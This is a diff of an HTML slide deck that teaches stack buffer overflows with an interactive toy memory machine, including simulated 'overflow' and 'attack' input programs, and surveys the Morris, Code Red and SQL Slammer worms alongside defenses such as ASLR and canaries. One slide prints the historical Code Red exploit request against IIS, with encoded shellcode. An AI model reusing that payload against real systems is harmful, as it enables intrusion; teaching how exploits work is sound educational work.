@@ -26,7 +26,7 @@
       </article>
 
       <article>
-        <img style="display: block; margin: auto" src="images/memory-model.png">
+        <img style="display: block; margin: auto; position:relative; top:50px" src="images/memory-model.png">
       </article>
 
       <article>
@@ -216,7 +216,7 @@
             <td data-address=43></td> </tr>
         </table>
         <div style="position: absolute; right: 50px; top: 80px; width: 400px">
-          <p>R: Read a byte into memory</p>
+          <p>R: Read a letter or number into the buffer</p>
           <p id="read-program-input">
             Input:
             <span data-input=0>Y</span>
@@ -389,9 +389,7 @@
             <td data-address=43></td> </tr>
         </table>
         <div style="position: absolute; right: 50px; top: 80px; width: 400px">
-          <p>
-            Gx: Goto x
-          </p>
+          <p>Gx: Goto x</p>
           <p id="dry-program-input">
             Input:
             <span data-input=0>Y</span>
@@ -419,74 +417,536 @@
         </script>
       </article>
 
-      <article>
-        <table id="freeform-program-table" class="memory" style="float:left">
-          <tr>
-            <td class="address"></td>
-            <td class="address">IP</td>
-            <td class="address">SP</td>
-            <td class="address">BP</td>
-          </tr>
-          <tr>
-            <td class="address"></td>
-            <td class="ip"></td>
-            <td class="sp"></td>
-            <td class="bp"></td>
-          </tr>
+     <article>
+        <table id="troll-program-table" class="memory" style="float:left">
           <tr> <td class="address">0</td>
-            <td data-address=0></td>
-            <td data-address=1></td>
-            <td data-address=2></td>
-            <td data-address=3></td></tr>
+            <td data-address=0>R</td>
+            <td data-address=1>R</td>
+            <td data-address=2>R</td>
+            <td data-address=3>R</td> </tr>
           <tr> <td class="address">4</td>
-            <td data-address=4></td>
-            <td data-address=5></td>
-            <td data-address=6></td>
-            <td data-address=7></td></tr>
+            <td data-address=4>R</td>
+            <td data-address=5>R</td>
+            <td data-address=6>R</td>
+            <td data-address=7>R</td></tr>
           <tr> <td class="address">8</td>
-            <td data-address=8>P</td>
-            <td data-address=9>O</td>
-            <td data-address=10>P</td>
-            <td data-address=11>K</td></tr>
+            <td data-address=8>R</td>
+            <td data-address=9>R</td>
+            <td data-address=10>G</td>
+            <td data-address=11>32</td></tr>
           <tr> <td class="address">12</td>
             <td data-address=12></td>
             <td data-address=13></td>
             <td data-address=14></td>
             <td data-address=15></td></tr>
           <tr> <td class="address">16</td>
-            <td data-address=16>W</td>
-            <td data-address=17>Z</td>
-            <td data-address=18>8</td>
-            <td data-address=19>F</td></tr>
+            <td data-address=16></td>
+            <td data-address=17></td>
+            <td data-address=18></td>
+            <td data-address=19></td></tr>
           <tr> <td class="address">20</td>
             <td data-address=20></td>
             <td data-address=21></td>
             <td data-address=22></td>
             <td data-address=23></td></tr>
           <tr> <td class="address">24</td>
-            <td data-address=24>B</td>
-            <td data-address=25>S</td>
-            <td data-address=26>G</td>
-            <td data-address=27>16</td></tr>
+            <td data-address=24></td>
+            <td data-address=25></td>
+            <td data-address=26></td>
+            <td data-address=27></td></tr>
           <tr> <td class="address">28</td>
-            <td data-address=28>S</td>
-            <td data-address=29>G</td>
-            <td data-address=30>16</td>
-            <td data-address=31>S</td></tr>
+            <td data-address=28></td>
+            <td data-address=29></td>
+            <td data-address=30></td>
+            <td data-address=31></td></tr>
           <tr> <td class="address">32</td>
-            <td data-address=32>G</td>
-            <td data-address=33>16</td>
-            <td data-address=34>S</td>
-            <td data-address=35>G</td></tr>
+            <td data-address=32></td>
+            <td data-address=33></td>
+            <td data-address=34></td>
+            <td data-address=35></td></tr>
           <tr> <td class="address">36</td>
-            <td data-address=36>16</td>
-            <td data-address=37>S</td>
-            <td data-address=38>G</td>
-            <td data-address=39>16</td></tr>
+            <td data-address=36></td>
+            <td data-address=37></td>
+            <td data-address=38></td>
+            <td data-address=39></td></tr>
           <tr> <td class="address">40</td>
-            <td data-address=40>S</td>
-            <td data-address=41>G</td>
-            <td data-address=42>16</td>
+            <td data-address=40></td>
+            <td data-address=41></td>
+            <td data-address=42></td>
+            <td data-address=43></td> </tr>
+        </table>
+        <div style="position: absolute; right: 50px; top: 80px; width: 400px">
+          <p id="troll-program-input">
+            Input:
+            <span data-input=0>P</span>
+            <span data-input=1>T</span>
+            <span data-input=2>P</span>
+            <span data-input=3>R</span>
+            <span data-input=3>P</span>
+            <span data-input=4>O</span>
+            <span data-input=5>P</span>
+            <span data-input=6>L</span>
+            <span data-input=7>G</span>
+            <span data-input=8>36</span>
+            <p>R: Read a letter or number into the buffer</p>
+            <p>Gx: Goto x</p>
+            <p>Px: Print x</p>
+            <p>The buffer starts at address 32</p>
+          </p>
+          <p>
+            Output:
+            <p id="troll-program-output"></p>
+          </p>
+        </div>
+        <div>
+          <input onclick="trollProgram.step()" type="button" name="troll-program-step" value="Step" class="step-button">
+          <input onclick="trollProgram.reset()" type="button" name="troll-program-reset" value="Reset" class="reset-button">
+        </div>
+
+        <script type="text/javascript" charset="utf-8">
+          var trollProgram = createProgram({
+              startInstruction: 0,
+              memory: "#troll-program-table",
+              input:  "#troll-program-input",
+              output: "#troll-program-output",
+              reverseStack: true,
+              stackPointer: 41,
+              bufferPointer: 32})
+        </script>
+      </article>
+
+      <article>
+        <table id="reuse-program-table" class="memory" style="float:left">
+          <tr> <td class="address">0</td>
+            <td data-address=0>R</td>
+            <td data-address=1>S</td>
+            <td data-address=2>G</td>
+            <td data-address=3>20</td> </tr>
+          <tr> <td class="address">4</td>
+            <td data-address=4>R</td>
+            <td data-address=5>S</td>
+            <td data-address=6>G</td>
+            <td data-address=7>20</td></tr>
+          <tr> <td class="address">8</td>
+            <td data-address=8>R</td>
+            <td data-address=9>S</td>
+            <td data-address=10>G</td>
+            <td data-address=11>20</td></tr>
+          <tr> <td class="address">12</td>
+            <td data-address=12>R</td>
+            <td data-address=13>S</td>
+            <td data-address=14>G</td>
+            <td data-address=15>20</td></tr>
+          <tr> <td class="address">16</td>
+            <td data-address=16></td>
+            <td data-address=17></td>
+            <td data-address=18></td>
+            <td data-address=19></td></tr>
+          <tr> <td class="address">20</td>
+            <td data-address=20>P</td>
+            <td data-address=21>O</td>
+            <td data-address=22>P</td>
+            <td data-address=23>K</td></tr>
+          <tr> <td class="address">24</td>
+            <td data-address=24>F</td>
+            <td data-address=25></td>
+            <td data-address=26></td>
+            <td data-address=27></td></tr>
+          <tr> <td class="address">28</td>
+            <td data-address=28></td>
+            <td data-address=29></td>
+            <td data-address=30></td>
+            <td data-address=31></td></tr>
+          <tr> <td class="address">32</td>
+            <td data-address=32></td>
+            <td data-address=33></td>
+            <td data-address=34></td>
+            <td data-address=35></td></tr>
+          <tr> <td class="address">36</td>
+            <td data-address=36></td>
+            <td data-address=37></td>
+            <td data-address=38></td>
+            <td data-address=39></td></tr>
+          <tr> <td class="address">40</td>
+            <td data-address=40></td>
+            <td data-address=41></td>
+            <td data-address=42></td>
+            <td data-address=43></td> </tr>
+        </table>
+        <div style="position: absolute; right: 50px; top: 80px; width: 400px">
+          <p>
+            S: Save the address of the next instruction
+          </p>
+          <p>
+            F: Fetch the address of the next instruction
+          </p>
+          <p id="reuse-program-input">
+            Input:
+            <span data-input=0>Y</span>
+            <span data-input=1>E</span>
+            <span data-input=2>O</span>
+            <span data-input=3>P</span>
+          </p>
+          <p>
+            Output:
+            <p id="reuse-program-output"></p>
+          </p>
+        </div>
+        <div>
+          <input onclick="reuseProgram.step()" type="button" name="reuse-program-step" value="Step" class="step-button">
+          <input onclick="reuseProgram.reset()" type="button" name="reuse-program-reset" value="Reset" class="reset-button">
+        </div>
+
+        <script type="text/javascript" charset="utf-8">
+          var reuseProgram = createProgram({
+              startInstruction: 0,
+              memory: "#reuse-program-table",
+              input:  "#reuse-program-input",
+              output: "#reuse-program-output",
+              reverseStack: true,
+              stackPointer: 41,
+              bufferPointer: 36})
+        </script>
+      </article>
+
+      <article>
+        <table id="zero-program-table" class="memory" style="float:left">
+          <tr> <td class="address">0</td>
+            <td data-address=0>S</td>
+            <td data-address=1>G</td>
+            <td data-address=2>12</td>
+            <td data-address=3>G</td> </tr>
+          <tr> <td class="address">4</td>
+            <td data-address=4>0</td>
+            <td data-address=5></td>
+            <td data-address=6></td>
+            <td data-address=7></td></tr>
+          <tr> <td class="address">8</td>
+            <td data-address=8></td>
+            <td data-address=9></td>
+            <td data-address=10></td>
+            <td data-address=11></td></tr>
+          <tr> <td class="address">12</td>
+            <td data-address=12>R</td>
+            <td data-address=13>Z</td>
+            <td data-address=14>20</td>
+            <td data-address=15>F</td></tr>
+          <tr> <td class="address">16</td>
+            <td data-address=16></td>
+            <td data-address=17></td>
+            <td data-address=18></td>
+            <td data-address=19></td></tr>
+          <tr> <td class="address">20</td>
+            <td data-address=20>P</td>
+            <td data-address=21>O</td>
+            <td data-address=22>P</td>
+            <td data-address=23>K</td></tr>
+          <tr> <td class="address">24</td>
+            <td data-address=24></td>
+            <td data-address=25></td>
+            <td data-address=26></td>
+            <td data-address=27></td></tr>
+          <tr> <td class="address">28</td>
+            <td data-address=28></td>
+            <td data-address=29></td>
+            <td data-address=30></td>
+            <td data-address=31></td></tr>
+          <tr> <td class="address">32</td>
+            <td data-address=32></td>
+            <td data-address=33></td>
+            <td data-address=34></td>
+            <td data-address=35></td></tr>
+          <tr> <td class="address">36</td>
+            <td data-address=36></td>
+            <td data-address=37></td>
+            <td data-address=38></td>
+            <td data-address=39></td></tr>
+          <tr> <td class="address">40</td>
+            <td data-address=40></td>
+            <td data-address=41></td>
+            <td data-address=42></td>
+            <td data-address=43></td> </tr>
+        </table>
+        <div style="position: absolute; right: 50px; top: 80px; width: 400px">
+          <p>
+            Zx: Go to x if the last input was a zero
+          </p>
+          <p id="zero-program-input">
+            Input:
+            <span data-input=0>Y</span>
+            <span data-input=1>E</span>
+            <span data-input=2>O</span>
+            <span data-input=3>P</span>
+            <span data-input=3>0</span>
+          </p>
+          <p>
+            Output:
+            <p id="zero-program-output"></p>
+          </p>
+        </div>
+        <div>
+          <input onclick="zeroProgram.step()" type="button" name="zero-program-step" value="Step" class="step-button">
+          <input onclick="zeroProgram.reset()" type="button" name="zero-program-reset" value="Reset" class="reset-button">
+        </div>
+
+        <script type="text/javascript" charset="utf-8">
+          var zeroProgram = createProgram({
+              startInstruction: 0,
+              memory: "#zero-program-table",
+              input:  "#zero-program-input",
+              output: "#zero-program-output",
+              reverseStack: true,
+              stackPointer: 41,
+              bufferPointer: 32})
+        </script>
+      </article>
+
+      <article>
+        <table id="overflow-program-table" class="memory" style="float:left">
+          <tr> <td class="address">0</td>
+            <td data-address=0>S</td>
+            <td data-address=1>G</td>
+            <td data-address=2>12</td>
+            <td data-address=3>G</td> </tr>
+          <tr> <td class="address">4</td>
+            <td data-address=4>0</td>
+            <td data-address=5></td>
+            <td data-address=6></td>
+            <td data-address=7></td></tr>
+          <tr> <td class="address">8</td>
+            <td data-address=8></td>
+            <td data-address=9></td>
+            <td data-address=10></td>
+            <td data-address=11></td></tr>
+          <tr> <td class="address">12</td>
+            <td data-address=12>R</td>
+            <td data-address=13>Z</td>
+            <td data-address=14>20</td>
+            <td data-address=15>F</td></tr>
+          <tr> <td class="address">16</td>
+            <td data-address=16></td>
+            <td data-address=17></td>
+            <td data-address=18></td>
+            <td data-address=19></td></tr>
+          <tr> <td class="address">20</td>
+            <td data-address=20>P</td>
+            <td data-address=21>O</td>
+            <td data-address=22>P</td>
+            <td data-address=23>K</td></tr>
+          <tr> <td class="address">24</td>
+            <td data-address=24></td>
+            <td data-address=25></td>
+            <td data-address=26></td>
+            <td data-address=27></td></tr>
+          <tr> <td class="address">28</td>
+            <td data-address=28></td>
+            <td data-address=29></td>
+            <td data-address=30></td>
+            <td data-address=31></td></tr>
+          <tr> <td class="address">32</td>
+            <td data-address=32></td>
+            <td data-address=33></td>
+            <td data-address=34></td>
+            <td data-address=35></td></tr>
+          <tr> <td class="address">36</td>
+            <td data-address=36></td>
+            <td data-address=37></td>
+            <td data-address=38></td>
+            <td data-address=39></td></tr>
+          <tr> <td class="address">40</td>
+            <td data-address=40></td>
+            <td data-address=41></td>
+            <td data-address=42></td>
+            <td data-address=43></td> </tr>
+        </table>
+        <div style="position: absolute; right: 50px; top: 80px; width: 400px">
+          <p id="overflow-program-input">
+            Input:
+            <span data-input=0>Y</span>
+            <span data-input=1>_</span>
+            <span data-input=2>H</span>
+            <span data-input=3>E</span>
+            <span data-input=4>L</span>
+            <span data-input=5>O</span>
+            <span data-input=6>_</span>
+            <span data-input=7>T</span>
+            <span data-input=8>H</span>
+            <span data-input=9>A</span>
+            <span data-input=9>R</span>
+          </p>
+          <p>
+            Output:
+            <p id="overflow-program-output"></p>
+          </p>
+        </div>
+        <div>
+          <input onclick="overflowProgram.step()" type="button" name="overflow-program-step" value="Step" class="step-button">
+          <input onclick="overflowProgram.reset()" type="button" name="overflow-program-reset" value="Reset" class="reset-button">
+        </div>
+
+        <script type="text/javascript" charset="utf-8">
+          var overflowProgram = createProgram({
+              startInstruction: 0,
+              memory: "#overflow-program-table",
+              input:  "#overflow-program-input",
+              output: "#overflow-program-output",
+              reverseStack: true,
+              stackPointer: 41,
+              bufferPointer: 32})
+        </script>
+      </article>
+
+      <article>
+        <table id="attack-program-table" class="memory" style="float:left">
+          <tr> <td class="address">0</td>
+            <td data-address=0>S</td>
+            <td data-address=1>G</td>
+            <td data-address=2>12</td>
+            <td data-address=3>G</td> </tr>
+          <tr> <td class="address">4</td>
+            <td data-address=4>0</td>
+            <td data-address=5></td>
+            <td data-address=6></td>
+            <td data-address=7></td></tr>
+          <tr> <td class="address">8</td>
+            <td data-address=8></td>
+            <td data-address=9></td>
+            <td data-address=10></td>
+            <td data-address=11></td></tr>
+          <tr> <td class="address">12</td>
+            <td data-address=12>R</td>
+            <td data-address=13>Z</td>
+            <td data-address=14>20</td>
+            <td data-address=15>F</td></tr>
+          <tr> <td class="address">16</td>
+            <td data-address=16></td>
+            <td data-address=17></td>
+            <td data-address=18></td>
+            <td data-address=19></td></tr>
+          <tr> <td class="address">20</td>
+            <td data-address=20>P</td>
+            <td data-address=21>O</td>
+            <td data-address=22>P</td>
+            <td data-address=23>K</td></tr>
+          <tr> <td class="address">24</td>
+            <td data-address=24></td>
+            <td data-address=25></td>
+            <td data-address=26></td>
+            <td data-address=27></td></tr>
+          <tr> <td class="address">28</td>
+            <td data-address=28></td>
+            <td data-address=29></td>
+            <td data-address=30></td>
+            <td data-address=31></td></tr>
+          <tr> <td class="address">32</td>
+            <td data-address=32></td>
+            <td data-address=33></td>
+            <td data-address=34></td>
+            <td data-address=35></td></tr>
+          <tr> <td class="address">36</td>
+            <td data-address=36></td>
+            <td data-address=37></td>
+            <td data-address=38></td>
+            <td data-address=39></td></tr>
+          <tr> <td class="address">40</td>
+            <td data-address=40></td>
+            <td data-address=41></td>
+            <td data-address=42></td>
+            <td data-address=43></td> </tr>
+        </table>
+        <div style="position: absolute; right: 50px; top: 80px; width: 400px">
+          <p id="attack-program-input">
+            Input:
+            <span data-input=0>P</span>
+            <span data-input=1>L</span>
+            <span data-input=2>P</span>
+            <span data-input=3>O</span>
+            <span data-input=4>G</span>
+            <span data-input=5>32</span>
+            <span data-input=6>_</span>
+            <span data-input=7>_</span>
+            <span data-input=8>32</span>
+            <span data-input=9>_</span>
+            <span data-input=9>_</span>
+          </p>
+          <p>
+            Output:
+            <p id="attack-program-output"></p>
+          </p>
+        </div>
+        <div>
+          <input onclick="attackProgram.step()" type="button" name="attack-program-step" value="Step" class="step-button">
+          <input onclick="attackProgram.reset()" type="button" name="attack-program-reset" value="Reset" class="reset-button">
+        </div>
+
+        <script type="text/javascript" charset="utf-8">
+          var attackProgram = createProgram({
+              startInstruction: 0,
+              memory: "#attack-program-table",
+              input:  "#attack-program-input",
+              output: "#attack-program-output",
+              reverseStack: true,
+              stackPointer: 41,
+              bufferPointer: 32})
+        </script>
+      </article>
+
+      <article>
+        <table id="freeform-program-table" class="memory" style="float:left">
+          <tr> <td class="address">0</td>
+            <td data-address=0>S</td>
+            <td data-address=1>G</td>
+            <td data-address=2>12</td>
+            <td data-address=3>G</td> </tr>
+          <tr> <td class="address">4</td>
+            <td data-address=4>0</td>
+            <td data-address=5></td>
+            <td data-address=6></td>
+            <td data-address=7></td></tr>
+          <tr> <td class="address">8</td>
+            <td data-address=8></td>
+            <td data-address=9></td>
+            <td data-address=10></td>
+            <td data-address=11></td></tr>
+          <tr> <td class="address">12</td>
+            <td data-address=12>R</td>
+            <td data-address=13>Z</td>
+            <td data-address=14>20</td>
+            <td data-address=15>F</td></tr>
+          <tr> <td class="address">16</td>
+            <td data-address=16></td>
+            <td data-address=17></td>
+            <td data-address=18></td>
+            <td data-address=19></td></tr>
+          <tr> <td class="address">20</td>
+            <td data-address=20>P</td>
+            <td data-address=21>O</td>
+            <td data-address=22>P</td>
+            <td data-address=23>K</td></tr>
+          <tr> <td class="address">24</td>
+            <td data-address=24></td>
+            <td data-address=25></td>
+            <td data-address=26></td>
+            <td data-address=27></td></tr>
+          <tr> <td class="address">28</td>
+            <td data-address=28></td>
+            <td data-address=29></td>
+            <td data-address=30></td>
+            <td data-address=31></td></tr>
+          <tr> <td class="address">32</td>
+            <td data-address=32></td>
+            <td data-address=33></td>
+            <td data-address=34></td>
+            <td data-address=35></td></tr>
+          <tr> <td class="address">36</td>
+            <td data-address=36></td>
+            <td data-address=37></td>
+            <td data-address=38></td>
+            <td data-address=39></td></tr>
+          <tr> <td class="address">40</td>
+            <td data-address=40></td>
+            <td data-address=41></td>
+            <td data-address=42></td>
             <td data-address=43></td> </tr>
         </table>
         <div style="position: absolute; right: 50px; top: 80px; width: 400px">
@@ -495,11 +955,17 @@
             <input type="text" id="user-input" value="">
             <input type="button" id="register-input" value="Enter">
             <br>
-            <span data-input=0>_</span>
-            <span data-input=1>P</span>
-            <span data-input=2>X</span>
-            <span data-input=3>_</span>
-            <span data-input=4>1</span>
+            <span data-input=0>P</span>
+            <span data-input=1>L</span>
+            <span data-input=2>P</span>
+            <span data-input=3>O</span>
+            <span data-input=4>G</span>
+            <span data-input=5>32</span>
+            <span data-input=6>_</span>
+            <span data-input=7>_</span>
+            <span data-input=8>32</span>
+            <span data-input=9>_</span>
+            <span data-input=9>_</span>
           </p>
           <p>
             Output:
@@ -528,12 +994,13 @@
 
         <script type="text/javascript" charset="utf-8">
           var freeformProgram = createProgram({
-              startInstruction: 24,
+              startInstruction: 0,
               memory: "#freeform-program-table",
               input:  "#freeform-program-input",
               output: "#freeform-program-output",
+              bufferPointer: 32,
               reverseStack: true,
-              stackPointer: 5})
+              stackPointer: 41})
         </script>
       </article>
 
@@ -542,9 +1009,47 @@
       </article>
 
       <article>
-        <p>Microsoft IIS - Code Red</p>
-        <p>fingerd - The Morris Worm of 1988</p>
-        <p>SQL Server - SQLSlammer</p>
+        <div style="position:relative; top: 200px">
+          <p>The Morris Worm</p>
+          <p>fingerd</p>
+          <p>Accidentally overloads host machines</p>
+        </div>
+      </article>
+
+      <article>
+        <p>Code Red worm</p>
+        <p>Microsoft IIS web server</p>
+        <p>359,000 computers infected</p>
+        <pre>
+        GET /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNN
+            NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+            NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+            NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+            NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+            NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+            NNNNNNNNNNNNNNNNNNN
+            %u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801
+            %u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3
+            %u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0
+        </pre>
+      </article>
+
+      <article>
+        <div style="position:relative; top: 200px">
+          <p>SQLSlammer</p>
+          <p>Microsoft SQL Server</p>
+          <p>Causes a bunch of routers on the Internet to kill each other</p>
+        </div>
+      </article>
+
+      <article>
+        <h1>Defense</h1>
+        <p>Non-executable stack</p>
+        <p>Address Space Layout Randomization</p>
+        <p>Canaries</p>
+      </article>
+      <article>
+        <h1><a href="http://smashthestack.org/">http://smashthestack.org/</a><br>IO Wargame</h1>
       </article>
     </section>
   </body>
